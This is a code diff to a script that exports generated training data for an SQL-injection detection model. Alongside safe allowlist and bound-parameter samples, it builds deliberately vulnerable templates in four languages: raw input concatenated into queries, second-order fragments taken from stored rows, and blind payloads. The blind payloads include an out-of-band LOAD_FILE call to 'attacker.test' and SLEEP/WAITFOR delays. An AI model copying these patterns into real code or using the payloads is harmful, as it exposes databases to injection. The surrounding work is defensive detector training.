@@ -1,5 +1,7 @@
+# V20_1_TRAINING_EXPORT_DIRECT_REPLACEMENT_MARKER
+# V20 attack-surface ML-first generated training families are included in this file.
 r"""
-Export Model-1 V18 focused generalization training data for Google Colab.
+Export Model-1 V20 model1-cnn-bilstm-dual-head-v20-attack-surface-ml95 V18 focused generalization training data for Google Colab.
 This file replaces backend/scripts/export_for_colab.py with the SAME name.
 
 Why V18 exists
@@ -176,22 +178,8 @@ def audit_focus_from_csv(paths: List[str]) -> Dict[str, int]:
                 # Audit CSVs contain ml_predicted_*; API/direct test-result CSVs contain actual_* only.
                 # For V18 focusing, actual_* is enough to learn which adversarial family failed,
                 # while still never copying benchmark source code.
-                ml_v = (
-                    row.get("ml_predicted_verdict")
-                    or row.get("ml_label")
-                    or row.get("actual_verdict")
-                    or row.get("Actual")
-                    or ""
-                ).strip().upper()
-                ml_t = (
-                    row.get("ml_predicted_attack_type")
-                    or row.get("ml_attack_type")
-                    or row.get("actual_type")
-                    or row.get("Actual Type")
-                    or ""
-                ).strip().upper()
-                if ml_v == "SUSPICIOUS":
-                    ml_v = "VULNERABLE"
+                ml_v = (row.get("ml_predicted_verdict") or row.get("actual_verdict") or row.get("Actual") or "").strip().upper()
+                ml_t = (row.get("ml_predicted_attack_type") or row.get("actual_type") or row.get("Actual Type") or "").strip().upper()
                 lang = file_name.split("/")[0].strip().lower() or "unknown"
                 fam = _family_from_file(file_name)
 
@@ -1798,71 +1786,463 @@ def v18_calibration_samples(seed: int, safe_per_family: int, hardcase_per_family
             code = add_noise_to_code("javascript", fn(r), r, salt=seed + 181000 + fi * 400 + j)
             yield "javascript", "NONE", f"v18_safe_sequelize_guard/{seed}/{fi}/{j:04d}", code, "SAFE", True, "v18_safe_sequelize_guard"
 
+# ─────────────────────────────────────────────────────────────────────────────
+# V20 attack-surface ML-first calibration families.
+# Generated families only; no benchmark file is copied. These teach the model
+# the same concepts that the V19 hybrid hotfix had to cover with raw evidence:
+# SAFE allowlisted SQL identifiers, unsafe raw-used counterexamples, ORM bind
+# safety, raw ORM templates, OOB/time BLIND, and Java/PHP SECOND_ORDER provenance.
+# ─────────────────────────────────────────────────────────────────────────────
+
+_v18_calibration_samples_prev_v20 = v18_calibration_samples
+
+
+def v20_py_safe_order_direct(r):
+    return f'''
+def list_{ident(r, 'fn')}(request, conn):
+    allowed = {{"created": "created_at", "email": "email", "status": "status"}}
+    sort = allowed.get(request.GET.get("sort"), "created_at")
+    sql = "SELECT id,email FROM users WHERE tenant_id=? ORDER BY " + sort
+    return conn.execute(sql, (request.user.tenant_id,)).fetchall()
+'''
+
+
+def v20_py_safe_order_alias_helper(r):
+    helper = ident(r, 'pick')
+    return f'''
+def {helper}(raw):
+    cols = {{"created": "created_at", "email": "email", "status": "status"}}
+    selected = cols.get(raw, "created_at")
+    return selected
+
+def list_{ident(r, 'fn')}(request, conn):
+    safe_col = {helper}(request.GET.get("sort"))
+    alias_col = safe_col
+    sql = f"SELECT id,email FROM users WHERE tenant_id=? ORDER BY {{alias_col}}"
+    return conn.execute(sql, (request.user.tenant_id,)).fetchall()
+'''
+
+
+def v20_js_safe_order_direct(r):
+    return f'''
+async function list_{ident(r, 'fn')}(req, db) {{
+  const columns = {{ created: "created_at", email: "email", status: "status" }};
+  const sort = columns[String(req.query.sort || "").trim()] || "created_at";
+  const sql = "SELECT id,email FROM users WHERE tenant_id=? ORDER BY " + sort;
+  return db.all(sql, [req.tenantId]);
+}}
+'''
+
+
+def v20_js_safe_order_alias_helper(r):
+    helper = ident(r, 'pick')
+    return f'''
+function {helper}(raw) {{
+  const columns = {{ created: "created_at", email: "email", status: "status" }};
+  return columns[String(raw || "").trim()] || "created_at";
+}}
+async function list_{ident(r, 'fn')}(req, db) {{
+  const selected = {helper}(req.query.sort);
+  const alias = selected;
+  const sql = `SELECT id,email FROM users WHERE tenant_id=? ORDER BY ${{alias}}`;
+  return db.all(sql, [req.tenantId]);
+}}
+'''
+
+
+def v20_java_safe_order_direct(r):
+    cls = ident(r, 'Repo').replace('_', '')
+    return f'''
+class {cls} {{
+  ResultSet list(HttpServletRequest req, Connection c) throws Exception {{
+    java.util.Map<String,String> cols = java.util.Map.of("created", "created_at", "email", "email", "status", "status");
+    String sort = cols.getOrDefault(req.getParameter("sort"), "created_at");
+    String sql = "SELECT id,email FROM users WHERE tenant_id=? ORDER BY " + sort;
+    PreparedStatement ps = c.prepareStatement(sql);
+    ps.setString(1, req.getUserPrincipal().getName());
+    return ps.executeQuery();
+  }}
+}}
+'''
+
+
+def v20_java_safe_order_helper(r):
+    cls = ident(r, 'Svc').replace('_', '')
+    return f'''
+class {cls} {{
+  String pick(String raw) {{
+    java.util.Set<String> cols = java.util.Set.of("created_at", "email", "status");
+    return cols.contains(raw) ? raw : "created_at";
+  }}
+  ResultSet list(HttpServletRequest req, Connection c) throws Exception {{
+    String safe = pick(req.getParameter("sort"));
+    String alias = safe;
+    String sql = "SELECT id,email FROM users WHERE tenant_id=? ORDER BY " + alias;
+    PreparedStatement ps = c.prepareStatement(sql);
+    ps.setString(1, req.getUserPrincipal().getName());
+    return ps.executeQuery();
+  }}
+}}
+'''
+
+
+def v20_php_safe_order_direct(r):
+    return f'''<?php
+function list_{ident(r, 'fn')}($pdo, $q) {{
+    $columns = ["created" => "created_at", "email" => "email", "status" => "status"];
+    $sort = $columns[$q["sort"] ?? "created"] ?? "created_at";
+    $sql = "SELECT id,email FROM users WHERE tenant_id=? ORDER BY " . $sort;
+    $stmt = $pdo->prepare($sql);
+    $stmt->execute([$q["tenant"]]);
+    return $stmt->fetchAll(PDO::FETCH_ASSOC);
+}}
+?>'''
+
+
+def v20_php_safe_order_helper(r):
+    return f'''<?php
+function pick_{ident(r, 'fn')}($raw): string {{
+    $columns = ["created" => "created_at", "email" => "email", "status" => "status"];
+    return $columns[$raw ?? "created"] ?? "created_at";
+}}
+function list_{ident(r, 'fn')}($pdo, $q) {{
+    $safe = pick_{ident(r, 'fn')}($q["sort"] ?? "created");
+    $alias = $safe;
+    $stmt = $pdo->prepare("SELECT id,email FROM users WHERE tenant_id=? ORDER BY " . $alias);
+    $stmt->execute([$q["tenant"]]);
+    return $stmt->fetchAll(PDO::FETCH_ASSOC);
+}}
+?>'''
+
+
+def v20_py_vuln_allowlist_raw_used(r):
+    return f'''
+def list_{ident(r, 'fn')}(request, conn):
+    allowed = {{"created": "created_at", "email": "email"}}
+    safe = allowed.get(request.GET.get("sort"), "created_at")
+    raw = request.GET.get("sort", "")
+    sql = "SELECT id FROM users ORDER BY " + raw
+    return conn.execute(sql).fetchall()
+'''
+
+
+def v20_js_vuln_allowlist_raw_used(r):
+    return f'''
+async function list_{ident(r, 'fn')}(req, db) {{
+  const allowed = {{ created: "created_at", email: "email" }};
+  const safe = allowed[req.query.sort] || "created_at";
+  const rawAlias = String(req.query.sort || "").trim();
+  const sql = "SELECT id FROM users ORDER BY " + rawAlias;
+  return db.all(sql);
+}}
+'''
+
+
+def v20_java_vuln_allowlist_raw_used(r):
+    cls = ident(r, 'Unsafe').replace('_', '')
+    return f'''
+class {cls} {{
+  ResultSet list(HttpServletRequest req, Statement st) throws Exception {{
+    java.util.Set<String> allowed = java.util.Set.of("created_at", "email");
+    String safe = allowed.contains(req.getParameter("sort")) ? req.getParameter("sort") : "created_at";
+    String rawSort = req.getParameter("sort");
+    String sql = "SELECT id FROM users ORDER BY " + rawSort;
+    return st.executeQuery(sql);
+  }}
+}}
+'''
+
+
+def v20_php_vuln_allowlist_raw_used(r):
+    return f'''<?php
+function list_{ident(r, 'fn')}($pdo, $q) {{
+    $cols = ["created" => "created_at", "email" => "email"];
+    $safe = $cols[$q["sort"] ?? "created"] ?? "created_at";
+    $rawSort = trim((string)($q["sort"] ?? ""));
+    $stmt = $pdo->query("SELECT id FROM users ORDER BY " . $rawSort);
+    return $stmt->fetchAll();
+}}
+?>'''
+
+
+def v20_js_safe_orm_bind(r):
+    return f'''
+async function search_{ident(r, 'fn')}(req, sequelize, QueryTypes) {{
+  const sql = `SELECT id,email FROM users WHERE tenant_id = :tenant AND email LIKE :email`;
+  return sequelize.query(sql, {{
+    replacements: {{ tenant: req.tenantId, email: `%${{req.query.email || ""}}%` }},
+    type: QueryTypes.SELECT
+  }});
+}}
+'''
+
+
+def v20_js_vuln_raw_orm_template(r):
+    return f'''
+async function search_{ident(r, 'fn')}(req, sequelize) {{
+  const email = req.query.email || "";
+  const sql = `SELECT id,email FROM users WHERE email LIKE '%${{email}}%'`;
+  return sequelize.query(sql);
+}}
+'''
+
+
+def v20_py_vuln_raw_orm_template(r):
+    return f'''
+def search_{ident(r, 'fn')}(request, session):
+    email = request.GET.get("email", "")
+    sql = text(f"SELECT id,email FROM users WHERE email LIKE '%{{email}}%'")
+    return session.execute(sql).fetchall()
+'''
+
+
+def v20_safe_enum_direction(lang, r):
+    if lang == 'python':
+        return f'''
+def list_{ident(r, 'fn')}(request, conn):
+    direction = "DESC" if request.GET.get("dir") == "desc" else "ASC"
+    sql = "SELECT id FROM users ORDER BY created_at " + direction
+    return conn.execute(sql).fetchall()
+'''
+    if lang == 'javascript':
+        return f'''
+async function list_{ident(r, 'fn')}(req, db) {{
+  const dir = req.query.dir === "desc" ? "DESC" : "ASC";
+  const sql = "SELECT id FROM users ORDER BY created_at " + dir;
+  return db.all(sql);
+}}
+'''
+    if lang == 'java':
+        cls = ident(r, 'EnumDir').replace('_','')
+        return f'''
+class {cls} {{
+  ResultSet list(HttpServletRequest req, Statement st) throws Exception {{
+    String dir = "desc".equals(req.getParameter("dir")) ? "DESC" : "ASC";
+    String sql = "SELECT id FROM users ORDER BY created_at " + dir;
+    return st.executeQuery(sql);
+  }}
+}}
+'''
+    return f'''<?php
+function list_{ident(r, 'fn')}($pdo, $q) {{
+    $dir = (($q["dir"] ?? "") === "desc") ? "DESC" : "ASC";
+    return $pdo->query("SELECT id FROM users ORDER BY created_at " . $dir)->fetchAll();
+}}
+?>'''
+
+
+def v20_second_order_java(r):
+    cls = ident(r, 'Stored').replace('_','')
+    source = r.choice(['where_clause', 'order_clause', 'sql_body', 'sql_fragment', 'saved_filter'])
+    return f'''
+class {cls} {{
+  ResultSet run(Connection c, String id) throws Exception {{
+    PreparedStatement ps = c.prepareStatement("SELECT {source} FROM saved_reports WHERE id=?");
+    ps.setString(1, id);
+    ResultSet rs = ps.executeQuery(); rs.next();
+    String fragment = rs.getString("{source}");
+    String sql = "SELECT id FROM audit_log WHERE tenant_id=? AND " + fragment;
+    return c.createStatement().executeQuery(sql);
+  }}
+}}
+'''
+
+
+def v20_second_order_php(r):
+    source = r.choice(['where_clause', 'order_clause', 'sql_body', 'sql_fragment', 'saved_filter', 'policy_sql'])
+    return f'''<?php
+function run_{ident(r, 'fn')}($pdo, $id) {{
+    $stmt = $pdo->prepare("SELECT {source} FROM saved_reports WHERE id=?");
+    $stmt->execute([$id]);
+    $row = $stmt->fetch(PDO::FETCH_ASSOC);
+    $fragment = $row["{source}"];
+    $sql = "SELECT id FROM audit_log WHERE tenant_id=? AND " . $fragment;
+    return $pdo->query($sql)->fetchAll();
+}}
+?>'''
+
+
+def v20_second_order_python(r):
+    return f'''
+def run_{ident(r, 'fn')}(request, conn, cache):
+    policy = cache.get("tenant-policy:" + request.GET.get("tenant", ""))
+    fragment = policy.get("where_clause", "1=1")
+    sql = "SELECT id FROM audit_log WHERE tenant_id=? AND " + fragment
+    return conn.execute(sql, (request.GET.get("tenant"),)).fetchall()
+'''
+
+
+def v20_second_order_js(r):
+    return f'''
+async function run_{ident(r, 'fn')}(req, db, cache) {{
+  const policy = await cache.get("tenant-policy:" + req.tenantId);
+  const fragment = policy.where_clause || "1=1";
+  const sql = "SELECT id FROM audit_log WHERE tenant_id=? AND " + fragment;
+  return db.all(sql, [req.tenantId]);
+}}
+'''
+
+
+def v20_blind_oob_or_time(lang, r):
+    if lang == 'python':
+        return f'''
+def check_{ident(r, 'fn')}(request, conn):
+    value = request.GET.get("email", "")
+    sql = "SELECT id FROM users WHERE email='" + value + "' OR LOAD_FILE('\\\\attacker.test\\a') IS NOT NULL"
+    return conn.execute(sql).fetchone() is not None
+'''
+    if lang == 'javascript':
+        return f'''
+async function check_{ident(r, 'fn')}(req, db) {{
+  const email = req.query.email || "";
+  const sql = "SELECT id FROM users WHERE email='" + email + "' OR LOAD_FILE('\\\\attacker.test\\a') IS NOT NULL";
+  return !!(await db.get(sql));
+}}
+'''
+    if lang == 'java':
+        cls = ident(r, 'Blind').replace('_','')
+        return f'''
+class {cls} {{
+  boolean check(HttpServletRequest req, Statement st) throws Exception {{
+    String email = req.getParameter("email");
+    String sql = "SELECT id FROM users WHERE email='" + email + "'; WAITFOR DELAY '00:00:05'";
+    return st.executeQuery(sql).next();
+  }}
+}}
+'''
+    return f'''<?php
+function check_{ident(r, 'fn')}($pdo, $q) {{
+    $email = $q["email"] ?? "";
+    $sql = "SELECT id FROM users WHERE email='" . $email . "' OR IF(1=1,SLEEP(5),0)";
+    return $pdo->query($sql)->fetchColumn() !== false;
+}}
+?>'''
+
+
+def v18_calibration_samples(seed: int, safe_per_family: int, hardcase_per_family: int, focus: Dict[str, int]):  # type: ignore[override]
+    yield from _v18_calibration_samples_prev_v20(seed, safe_per_family, hardcase_per_family, focus)
+    r = random.Random(seed + 20000)
+
+    safe_by_lang = {
+        'python': [v20_py_safe_order_direct, v20_py_safe_order_alias_helper],
+        'javascript': [v20_js_safe_order_direct, v20_js_safe_order_alias_helper, v20_js_safe_orm_bind],
+        'java': [v20_java_safe_order_direct, v20_java_safe_order_helper],
+        'php': [v20_php_safe_order_direct, v20_php_safe_order_helper],
+    }
+    vuln_inband_by_lang = {
+        'python': [v20_py_vuln_allowlist_raw_used, v20_py_vuln_raw_orm_template],
+        'javascript': [v20_js_vuln_allowlist_raw_used, v20_js_vuln_raw_orm_template],
+        'java': [v20_java_vuln_allowlist_raw_used],
+        'php': [v20_php_vuln_allowlist_raw_used],
+    }
+    second_by_lang = {
+        'python': [v20_second_order_python],
+        'javascript': [v20_second_order_js],
+        'java': [v20_second_order_java],
+        'php': [v20_second_order_php],
+    }
+
+    for lang, factories in safe_by_lang.items():
+        for fi, fn in enumerate(factories):
+            n = safe_per_family + 16
+            for j in range(n):
+                code = add_noise_to_code(lang, fn(r), r, salt=seed + 200000 + fi*500 + j)
+                yield lang, 'NONE', f'v20_safe_allowlist_bind/{seed}/{lang}/{fi}/{j:04d}', code, 'SAFE', True, 'v20_safe_allowlist_bind'
+        for j in range(safe_per_family + 8):
+            code = add_noise_to_code(lang, v20_safe_enum_direction(lang, r), r, salt=seed + 201000 + j)
+            yield lang, 'NONE', f'v20_safe_enum_constant/{seed}/{lang}/{j:04d}', code, 'SAFE', True, 'v20_safe_enum_constant'
+
+    for lang, factories in vuln_inband_by_lang.items():
+        for fi, fn in enumerate(factories):
+            n = hardcase_per_family + 14
+            for j in range(n):
+                code = add_noise_to_code(lang, fn(r), r, salt=seed + 202000 + fi*500 + j)
+                yield lang, 'IN_BAND', f'v20_vuln_raw_used_counterexample/{seed}/{lang}/{fi}/{j:04d}', code, 'VULNERABLE', True, 'v20_vuln_raw_used_counterexample'
+
+    for lang, factories in second_by_lang.items():
+        for fi, fn in enumerate(factories):
+            boost = 24 if lang in ('java', 'php') else 12
+            n = hardcase_per_family + boost
+            for j in range(n):
+                code = add_noise_to_code(lang, fn(r), r, salt=seed + 203000 + fi*500 + j)
+                yield lang, 'SECOND_ORDER', f'v20_second_order_provenance/{seed}/{lang}/{fi}/{j:04d}', code, 'VULNERABLE', True, 'v20_second_order_provenance'
+
+    for lang in LANG_EXT:
+        for j in range(hardcase_per_family + 6):
+            code = add_noise_to_code(lang, v20_blind_oob_or_time(lang, r), r, salt=seed + 204000 + j)
+            yield lang, 'BLIND', f'v20_blind_oob_time/{seed}/{lang}/{j:04d}', code, 'VULNERABLE', True, 'v20_blind_oob_time'
+
+
+def apply_binary_balance_resampling(arrays: dict, target_safe_ratio: float, seed: int = 20262001) -> tuple[dict, dict]:
+    """Duplicate SAFE samples until SAFE ratio reaches target.
+
+    This is intentionally simple and transparent. It does not create new benchmark
+    leakage; it only reweights/duplicates generated SAFE hardcases already present
+    in the export, which is useful when V20 adds many vulnerable provenance and
+    raw-used counterexamples.
+    """
+    if not target_safe_ratio or target_safe_ratio <= 0:
+        return arrays, {"enabled": False, "added": 0}
+
+    y = arrays.get("y")
+    if y is None or len(y) == 0:
+        return arrays, {"enabled": False, "added": 0}
+
+    # ATTACK/NONE id is type-level; y is binary in the base exporter: 0 SAFE, 1 VULNERABLE.
+    y_arr = np.asarray(y)
+    safe_idx = np.where(y_arr == 0)[0]
+    vuln_idx = np.where(y_arr != 0)[0]
+    safe = int(len(safe_idx))
+    total = int(len(y_arr))
+    current_ratio = safe / total if total else 0.0
+
+    if safe == 0 or current_ratio >= target_safe_ratio:
+        return arrays, {
+            "enabled": True,
+            "target_safe_ratio": float(target_safe_ratio),
+            "before_safe": safe,
+            "before_total": total,
+            "before_safe_ratio": current_ratio,
+            "added": 0,
+        }
+
+    # Solve (safe + x) / (total + x) >= target
+    needed = int(np.ceil((target_safe_ratio * total - safe) / max(1e-9, (1.0 - target_safe_ratio))))
+    needed = max(0, needed)
+
+    rng = np.random.default_rng(seed)
+    picked = rng.choice(safe_idx, size=needed, replace=True)
+
+    balanced = {}
+    for k, v in arrays.items():
+        arr = np.asarray(v)
+        extra = arr[picked].copy()
+        if k == "sample_family":
+            extra = np.asarray([str(x) + "|v20_binary_balance_safe_resample" for x in extra], dtype=arr.dtype)
+        balanced[k] = np.concatenate([arr, extra], axis=0)
+
+    after_safe = safe + needed
+    after_total = total + needed
+    return balanced, {
+        "enabled": True,
+        "target_safe_ratio": float(target_safe_ratio),
+        "before_safe": safe,
+        "before_total": total,
+        "before_safe_ratio": current_ratio,
+        "added": int(needed),
+        "after_safe": int(after_safe),
+        "after_total": int(after_total),
+        "after_safe_ratio": float(after_safe / after_total if after_total else 0.0),
+        "resampled_unique_safe_sources": int(len(set(map(int, picked)))) if needed else 0,
+    }
+
+
 def make_profile(arrays: dict, vocab: dict, sequence_length: int, duplicates_dropped: int) -> dict:
     profile = _profile_dataset_base(arrays, vocab, sequence_length, duplicates_dropped)
     profile["sample_family_counts"] = dict(Counter(map(str, arrays.get("sample_family", []))))
     profile["avg_sample_weight_binary"] = float(np.mean(arrays["sample_weight_binary"])) if len(arrays["sample_weight_binary"]) else 1.0
     profile["avg_sample_weight_type"] = float(np.mean(arrays["sample_weight_type"])) if len(arrays["sample_weight_type"]) else 1.0
-    if "balance_resample_source_index" in arrays:
-        profile["binary_balance_resampled_count"] = int(len(arrays["balance_resample_source_index"]))
-        profile["binary_balance_resampled_unique_sources"] = int(len(set(map(int, arrays["balance_resample_source_index"]))))
     return profile
-
-
-def _append_resampled_rows(arrays: dict, indices: np.ndarray, family_label: str) -> dict:
-    """Append selected rows to every exported array, preserving metadata alignment."""
-    if len(indices) == 0:
-        return arrays
-    out = {}
-    for key, value in arrays.items():
-        extra = value[indices]
-        if key == "sample_family":
-            extra = np.array([f"{str(v)}|{family_label}" for v in extra])
-        elif key == "source_id":
-            extra = np.array([f"{str(v)}|resampled_ml95_{i}" for i, v in enumerate(extra)])
-        elif key == "path":
-            extra = np.array([f"resampled_ml95/{i:05d}_{str(v)}" for i, v in enumerate(extra)])
-        elif key == "suite_name":
-            extra = np.array(["generated_v18_ml95_binary_balance" for _ in extra])
-        out[key] = np.concatenate([value, extra])
-    out["balance_resample_source_index"] = indices.astype(np.int32)
-    return out
-
-
-def balance_binary_arrays(arrays: dict, target_safe_ratio: float, seed: int = 42) -> dict:
-    """Optionally resample the minority binary class for ML-only binary training.
-
-    This does not copy benchmark source files and does not alter production rules.
-    It only changes the Colab training export so the binary head does not learn
-    an accidental all-vulnerable or all-safe prior from generated hardcases.
-    """
-    if target_safe_ratio <= 0:
-        return arrays
-    y = arrays["y"].astype(int)
-    total = len(y)
-    if total == 0:
-        return arrays
-    safe_idx = np.where(y == 0)[0]
-    vuln_idx = np.where(y == 1)[0]
-    safe_n = len(safe_idx)
-    vuln_n = len(vuln_idx)
-    if safe_n == 0 or vuln_n == 0:
-        return arrays
-    target_safe_ratio = max(0.05, min(0.95, float(target_safe_ratio)))
-    rng = np.random.default_rng(seed)
-    current_safe_ratio = safe_n / total
-    if current_safe_ratio < target_safe_ratio:
-        # Need: (safe_n + k) / (total + k) = target_safe_ratio
-        k = int(np.ceil((target_safe_ratio * total - safe_n) / max(1e-9, 1.0 - target_safe_ratio)))
-        chosen = rng.choice(safe_idx, size=max(0, k), replace=True)
-        return _append_resampled_rows(arrays, chosen.astype(np.int32), "binary_balance_safe_resample")
-    if current_safe_ratio > target_safe_ratio:
-        # Rare case: oversample vulnerable instead.
-        target_vuln_ratio = 1.0 - target_safe_ratio
-        k = int(np.ceil((target_vuln_ratio * total - vuln_n) / max(1e-9, 1.0 - target_vuln_ratio)))
-        chosen = rng.choice(vuln_idx, size=max(0, k), replace=True)
-        return _append_resampled_rows(arrays, chosen.astype(np.int32), "binary_balance_vuln_resample")
-    return arrays
 
 
 def main() -> int:
@@ -1872,9 +2252,9 @@ def main() -> int:
     ap.add_argument("--generated-per-class", type=int, default=4, help="Base generated variants per class/language/seed")
     ap.add_argument("--hardcase-per-family", type=int, default=14, help="Vulnerable flow variants per family/language/seed")
     ap.add_argument("--safe-calibration-per-family", type=int, default=7, help="SAFE hard examples per safe family/language/seed")
+    ap.add_argument("--binary-balance-target", type=float, default=0.48, help="Minimum SAFE ratio after export; duplicates SAFE hardcases if needed. Use 0 to disable.")
     ap.add_argument("--generated-seeds", nargs="*", type=int, default=[20260630, 20260701, 20260702])
     ap.add_argument("--audit-csv", action="append", default=[], help="Optional audit CSV used only to focus generated families; no source copied.")
-    ap.add_argument("--binary-balance-target", type=float, default=0.48, help="Target SAFE ratio after export-time resampling for ML-only binary training. Use 0 to disable.")
     args = ap.parse_args()
 
     out_dir = Path(args.out)
@@ -1910,37 +2290,63 @@ def main() -> int:
         for lang, attack, source_id, code, label, focused, sample_kind in v18_calibration_samples(
             seed, args.safe_calibration_per_family, args.hardcase_per_family, focus
         ):
-            if label == "SAFE":
-                # Keep SAFE calibration, but do not let it suppress true vulnerabilities.
-                if sample_kind == "js_safe_sequelize_focus":
-                    # Preserve the V15 win: Sequelize replacements/bind must stay SAFE.
-                    bw, tw = 4.2, 3.6
-                    family = "v18_js_safe_sequelize_focus"
+            if str(sample_kind).startswith("v20_"):
+                suite_name = "generated_v20_attack_surface_ml95"
+                if label == "SAFE":
+                    if sample_kind == "v20_safe_allowlist_bind":
+                        # Main V20 gap: SAFE dynamic ORDER BY/helper/ORM bind must not look vulnerable.
+                        bw, tw = 7.0, 5.0
+                    elif sample_kind == "v20_safe_enum_constant":
+                        bw, tw = 5.5, 4.0
+                    else:
+                        bw, tw = 5.0, 4.0
+                    family = f"{sample_kind}:{lang}"
                 else:
-                    bw, tw = 3.2, 2.6
-                    family = f"v18_flow_safe:{lang}"
+                    if sample_kind == "v20_vuln_raw_used_counterexample":
+                        # Counterexample: allowlist exists but raw input is used -> still VULNERABLE/IN_BAND.
+                        bw, tw = 6.0, 7.0
+                    elif sample_kind == "v20_second_order_provenance":
+                        # Main type gap: Java/PHP provenance should stay SECOND_ORDER, not collapse to IN_BAND.
+                        bw = 5.2 if lang in ("java", "php") else 4.2
+                        tw = 8.5 if lang in ("java", "php") else 6.8
+                    elif sample_kind == "v20_blind_oob_time":
+                        bw, tw = 4.8, 8.0
+                    else:
+                        bw, tw = 4.5, 6.0
+                    family = f"{sample_kind}:{lang}:{attack}"
             else:
-                # V18 keeps V14/V15 type balance, with a narrow JS SECOND_ORDER boost.
-                if sample_kind == "js_second_order_focus":
-                    bw, tw = 5.2, 7.2
-                    family = "v18_js_second_order_focus"
-                elif attack == "IN_BAND":
-                    # Direct raw SQL / concat / template examples must not collapse into SECOND_ORDER.
-                    bw, tw = 4.2, 5.8
-                    family = f"v18_flow_vuln:{attack}"
-                elif attack == "BLIND":
-                    # Time/boolean/security-decision BLIND flows.
-                    bw, tw = 4.6, 7.6
-                    family = f"v18_flow_vuln:{attack}"
-                else:  # SECOND_ORDER
-                    # General SECOND_ORDER remains lower than the focused JS variants to avoid over-predicting it globally.
-                    bw, tw = 3.4, 2.8
-                    family = f"v18_flow_vuln:{attack}"
+                suite_name = "generated_v18_js_second_order_focus_calibration"
+                if label == "SAFE":
+                    # Keep SAFE calibration, but do not let it suppress true vulnerabilities.
+                    if sample_kind == "js_safe_sequelize_focus":
+                        # Preserve the V15 win: Sequelize replacements/bind must stay SAFE.
+                        bw, tw = 4.2, 3.6
+                        family = "v18_js_safe_sequelize_focus"
+                    else:
+                        bw, tw = 3.2, 2.6
+                        family = f"v18_flow_safe:{lang}"
+                else:
+                    # V18 keeps V14/V15 type balance, with a narrow JS SECOND_ORDER boost.
+                    if sample_kind == "js_second_order_focus":
+                        bw, tw = 5.2, 7.2
+                        family = "v18_js_second_order_focus"
+                    elif attack == "IN_BAND":
+                        # Direct raw SQL / concat / template examples must not collapse into SECOND_ORDER.
+                        bw, tw = 4.2, 5.8
+                        family = f"v18_flow_vuln:{attack}"
+                    elif attack == "BLIND":
+                        # Time/boolean/security-decision BLIND flows.
+                        bw, tw = 4.6, 7.6
+                        family = f"v18_flow_vuln:{attack}"
+                    else:  # SECOND_ORDER
+                        # General SECOND_ORDER remains lower than the focused JS variants to avoid over-predicting it globally.
+                        bw, tw = 3.4, 2.8
+                        family = f"v18_flow_vuln:{attack}"
             builder.add(
                 code, label, attack, lang,
                 path=f"{source_id}.{LANG_EXT[lang]}",
                 source_id=source_id,
-                suite_name="generated_v18_js_second_order_focus_calibration",
+                suite_name=suite_name,
                 binary_weight=bw,
                 type_weight=tw,
                 family=family,
@@ -1948,31 +2354,30 @@ def main() -> int:
 
     print("[4/5] Writing arrays and vocabulary...")
     arrays = builder.arrays()
-    arrays = balance_binary_arrays(arrays, args.binary_balance_target, seed=42)
-    resample_source_index = arrays.pop("balance_resample_source_index", None)
+    arrays, balance_info = apply_binary_balance_resampling(arrays, args.binary_balance_target, seed=20262001)
     rng = np.random.default_rng(42)
     perm = rng.permutation(len(arrays["y"]))
     arrays = {k: v[perm] for k, v in arrays.items()}
-    if resample_source_index is not None:
-        arrays["balance_resample_source_index"] = resample_source_index
 
     save_vocabulary(vocab, str(out_dir / "vocabulary.json"))
     np.savez(out_dir / "training_data.npz", **arrays)
 
     profile = make_profile(arrays, vocab, args.sequence_length, builder.duplicates_dropped)
+    profile["balance_info"] = balance_info
     (out_dir / "dataset_profile.json").write_text(json.dumps(profile, indent=2, ensure_ascii=False), encoding="utf-8")
     export_info = {
-        "export_version": "model1-v18-js-second-order-focused-same-names",
+        "export_version": "model1-v20-attack-surface-ml95-balanced-v20_1",
         "sequence_length": args.sequence_length,
         "generated_seeds": args.generated_seeds,
         "generated_per_class_baseline": args.generated_per_class,
         "hardcase_per_family": args.hardcase_per_family,
         "safe_calibration_per_family": args.safe_calibration_per_family,
+        "binary_balance_target": args.binary_balance_target,
+        "balance_info": balance_info,
         "audit_csvs": args.audit_csv,
         "audit_focus_counts": focus,
-        "binary_balance_target": args.binary_balance_target,
         "anti_leakage_note": "Audit CSVs focus generated family counts only; benchmark source files are not copied.",
-        "main_goal": "V18 semantic-input: add normalizer/vocabulary tokens for stored/config/cache fragments reaching SQL syntax, then retrain the CNN+BiLSTM on those signals while preserving V14/V15/V17 stability",
+        "main_goal": "V20 ML-first: train the model itself on SAFE allowlisted ORDER BY/helper/ORM bind, raw-used counterexamples, and Java/PHP SECOND_ORDER provenance while keeping hybrid regression stable",
         "profile": profile,
     }
     (out_dir / "export_info.json").write_text(json.dumps(export_info, indent=2, ensure_ascii=False), encoding="utf-8")
